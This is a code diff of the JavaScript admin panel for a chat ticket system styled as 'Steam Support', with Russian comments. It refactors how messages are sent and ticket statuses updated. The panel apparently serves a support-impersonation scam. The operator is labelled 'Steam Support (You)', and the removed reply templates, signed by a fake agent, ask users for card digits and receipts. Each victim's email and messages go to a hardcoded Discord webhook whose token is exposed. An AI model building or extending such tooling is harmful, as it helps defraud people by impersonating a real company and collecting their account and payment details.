-                    messageDiv.className = `admin-message ${msg.sender === 'user' ? 'user' : 'support'}`;
+                    messageDiv.className = `message ${msg.sender === 'user' ? 'message-user' : 'message-admin'}`;
                     
-                    const sender = msg.sender === 'user' ? 'User' : 'Steam Support (You)';
+                    const senderName = msg.sender === 'user' ? 'User' : 'Steam Support (You)';
                     const time = new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                     
                     messageDiv.innerHTML = `
-                        <div style="padding: 10px;">
-                            <div style="font-size: 11px; color: #8f98a0; margin-bottom: 5px;">
-                                <strong>${sender}</strong> • ${time}
-                            </div>
-                            <div style="white-space: pre-wrap; font-size: 13px;">${msg.message}</div>
+                        <div class="message-info">
+                            <span>${senderName}</span>
+                            <span>${time}</span>
                         </div>
+                        <div class="message-content">${msg.message}</div>
                     `;
                 }
                 
                 container.appendChild(messageDiv);
             });
-            
-            // Прокрутить вниз
-            container.scrollTop = container.scrollHeight;
         }
         
-        async function sendAdminMessage() {
-            if (!currentChatTicket) return;
+        async function sendMessage() {
+            if (!selectedTicketId) return;
             
-            const input = document.getElementById('adminChatInput');
-            const message = input.value.trim();
+            const messageInput = document.getElementById('messageInput');
+            const message = messageInput.value.trim();
+            const newStatus = document.getElementById('statusSelect').value;
             
             if (!message) {
                 alert('Please enter a message');
                 return;
             }
             
-            // Добавить сообщение в тикет
+            // Find ticket
+            const ticketIndex = tickets.findIndex(t => t.id === selectedTicketId);
+            if (ticketIndex === -1) return;
+            
+            // Add message
             const newMessage = {
                 sender: 'support',
                 message: message,
                 timestamp: new Date().toISOString()
             };
             
-            // Обновить локально
-            const ticketIndex = currentTickets.findIndex(t => t.id === currentChatTicket.id);
-            if (ticketIndex !== -1) {
-                currentTickets[ticketIndex].messages.push(newMessage);
-                currentTickets[ticketIndex].updated_at = new Date().toISOString();
-                
-                // Сохранить в localStorage
-                localStorage.setItem('steam_tickets', JSON.stringify(currentTickets));
-                
-                // Обновить отображение
-                displayAdminChatMessages(currentTickets[ticketIndex].messages);
-                
-                // Очистить поле ввода
-                input.value = '';
-                
-                // Отправить на сервер
+            tickets[ticketIndex].messages.push(newMessage);
+            tickets[ticketIndex].status = newStatus;
+            tickets[ticketIndex].updated_at = new Date().toISOString();
+            
+            // Save to localStorage
+            localStorage.setItem('steam_tickets', JSON.stringify(tickets));
+            
+            // Update UI
+            displayMessages(tickets[ticketIndex].messages);
+            document.getElementById('chatStatus').textContent = newStatus;
+            document.getElementById('chatStatus').className = `status-${newStatus}`;
+            
+            // Clear input
+            messageInput.value = '';
+            
+            // Send to server if online
+            if (isApiOnline) {
                 try {
-                    await fetch(`${API_SERVER}?action=add_message&ticket_id=${currentChatTicket.id}`, {
+                    // Send message
+                    await fetch(`${API_SERVER}?action=add_message&ticket_id=${selectedTicketId}`, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -252,62 +1087,8 @@
                         })
                     });
                     
-                    // Отправить Discord уведомление
-                    sendDiscordAdminNotification(currentChatTicket, message);
-                    
-                } catch (error) {
-                    console.log('Failed to send to server');
-                }
-            }
-        }
-        
-        function insertTemplate(template) {
-            const input = document.getElementById('adminChatInput');
-            input.value = template;
-            input.focus();
-        }
-        
-        function sendTemplateResponse() {
-            const templates = [
-                "Hi there,\n\nThank you for your message. We've received it and will review it shortly.\n\nSteam Support\nTravis",
-                "We appreciate your patience. Our team is currently reviewing your verification request and will get back to you soon.",
-                "Please provide the following additional information to help us process your request:\n- Last 4 digits of the card used for purchase\n- Approximate date of account creation\n- Any additional receipts you may have",
-                "Your verification request has been approved. Your account restrictions have been lifted.\n\nSteam Support\nTravis",
-                "We need more time to review your case. Please allow 24-48 hours for our team to complete the verification process."
-            ];
-            
-            const randomTemplate = templates[Math.floor(Math.random() * templates.length)];
-            document.getElementById('adminChatInput').value = randomTemplate;
-        }
-        
-        async function updateChatStatus() {
-            if (!currentChatTicket) return;
-            
-            const newStatus = document.getElementById('chatStatusSelect').value;
-            
-            // Обновить локально
-            const ticketIndex = currentTickets.findIndex(t => t.id === currentChatTicket.id);
-            if (ticketIndex !== -1) {
-                currentTickets[ticketIndex].status = newStatus;
-                currentTickets[ticketIndex].updated_at = new Date().toISOString();
-                
-                // Добавить системное сообщение
-                currentTickets[ticketIndex].messages.push({
-                    sender: 'system',
-                    message: `Ticket status changed to ${newStatus}`,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Сохранить
-                localStorage.setItem('steam_tickets', JSON.stringify(currentTickets));
-                
-                // Обновить отображение
-                document.getElementById('chatTicketStatus').textContent = newStatus;
-                displayAdminChatMessages(currentTickets[ticketIndex].messages);
-                
-                // Отправить на сервер
-                try {
-                    await fetch(`${API_SERVER}?action=update_status&ticket_id=${currentChatTicket.id}`, {
+                    // Update status
+                    await fetch(`${API_SERVER}?action=update_status&ticket_id=${selectedTicketId}`, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -316,20 +1097,29 @@
                             status: newStatus
                         })
                     });
+                    
                 } catch (error) {
-                    console.log('Failed to update status on server');
+                    console.log('Failed to send to server');
                 }
             }
+            
+            // Send Discord notification
+            sendDiscordNotification(tickets[ticketIndex], message);
+            
+            // Refresh tickets list
+            renderTickets();
+            updateStats();
         }
         
-        function sendDiscordAdminNotification(ticket, message) {
+        function sendDiscordNotification(ticket, message) {
             const webhookUrl = 'https://discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
             
             const discordMessage = {
-                content: `**📨 ADMIN RESPONSE SENT**\n` +
+                content: `**📨 ADMIN RESPONSE**\n` +
                         `**Ticket:** ${ticket.id}\n` +
                         `**To:** ${ticket.email}\n` +
-                        `**Response:** ${message.substring(0, 150)}${message.length > 150 ? '...' : ''}\n` +
+                        `**Status:** ${ticket.status}\n` +
+                        `**Message:** ${message.substring(0, 150)}${message.length > 150 ? '...' : ''}\n` +
                         `**Time:** ${new Date().toLocaleString()}`
             };
             
@@ -342,21 +1132,34 @@
             }).catch(() => {});
         }
         
-        // Модифицируем функцию openTicket для добавления кнопки чата
-        function openTicket(ticketId) {
-            // ... существующий код ...
+        function refreshTickets() {
+            const btn = event.target;
+            const originalText = btn.innerHTML;
             
-            // Добавить кнопку чата в modal
-            const ticketDetailsDiv = document.getElementById('ticketDetails');
-            const chatButton = document.createElement('button');
-            chatButton.innerHTML = '<i class="fas fa-comments"></i> Open Chat';
-            chatButton.style.cssText = 'background:#66c0f4; color:white; border:none; padding:8px 15px; border-radius:4px; cursor:pointer; margin-top:10px;';
-            chatButton.onclick = function() {
-                closeModal();
-                setTimeout(() => openChat(ticketId), 300);
-            };
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+            btn.disabled = true;
             
-            ticketDetailsDiv.appendChild(chatButton);
+            checkApiStatus().then(() => {
+                loadTickets();
+                
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                }, 1000);
+            });
+        }
+        
+        // Auto-refresh every 60 seconds
+        setInterval(() => {
+            if (localStorage.getItem('steam_admin_logged_in') === 'true') {
+                checkApiStatus();
+                loadTickets();
+            }
+        }, 60000);
+        
+        // Initialize on load
+        if (localStorage.getItem('steam_admin_logged_in') === 'true') {
+            showAdminPanel();
         }
     </script>
 </body>
